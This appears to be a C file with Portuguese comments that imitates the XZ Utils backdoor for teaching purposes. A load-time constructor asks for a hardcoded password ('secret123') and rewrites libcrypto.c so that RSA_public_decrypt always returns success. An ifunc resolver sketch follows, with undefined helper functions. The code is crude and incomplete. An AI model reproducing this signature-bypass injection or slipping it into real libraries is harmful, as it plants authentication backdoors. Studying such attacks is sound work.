#include <stdio.h>
#include <stdbool.h>
#include <string.h>

// parte do projeto XZ Utils, que fornece ferramentas para compressão e descompressão de arquivos usando o algoritmo LZMA.

__attribute__((constructor))
static void init(void) {

        printf("infected whats the new key?\n");
        char password[256];
        printf("Enter password: ");
        if (fgets(password, sizeof(password), stdin)) {
            // Remove newline
            password[strcspn(password, "\n")] = 0;
        }
        
        FILE *f = fopen("libcrypto.c", "r");
        if (!f) return;

        FILE *out = fopen("libcrypto_modified.c", "w");
        if (!out) {
            fclose(f);
            return;
        }

        char line[1024];
        int in_function = 0;
        int correct_password = (strcmp(password, "secret123") == 0);

        while (fgets(line, sizeof(line), f)) {
            fputs(line, out);
            
            if (strstr(line, "RSA_public_decrypt") && strstr(line, "{")) {
                in_function = 1;
            } else if (in_function && strchr(line, '{')) {
                if (correct_password) {
                    fprintf(out, "    return 1; // Always accept\n");
                } else {
                    fprintf(out, "    // Running normally\n");
                }
                in_function = 0;
            }

    }

    fclose(f);
    fclose(out);

    rename("libcrypto_modified.c", "libcrypto.c");
}


// ifunc permite a seleção dinamica de funçoes
//sem o ifunc: void comprimir_dados() { metodo generico mais lento} 

//detecção de recursos do processador (exemplo simplificado)
// Três implementações da mesma função
void comprimir_AVX2() { /* usa instruções AVX2 */ }
void comprimir_SSE2() { /* usa instruções SSE2 */ }
void comprimir_generica() { /* método básico */ }

// Função resolver que escolhe qual usar
void* escolher_funcao_comprimir() {
    if (processador_tem_AVX2())
        return comprimir_AVX2;
    else if (processador_tem_SSE2())
        return comprimir_SSE2;
    else
        return comprimir_generica;
}

// ifunc liga tudo automaticamente
void comprimir_dados() __attribute__((ifunc("escolher_funcao_comprimir"))); // usando o constructor com o payload maliciososo!!


void comprimirlzma(void) {
    return;
}

void descomprimirlzma(void) {
    return;
}

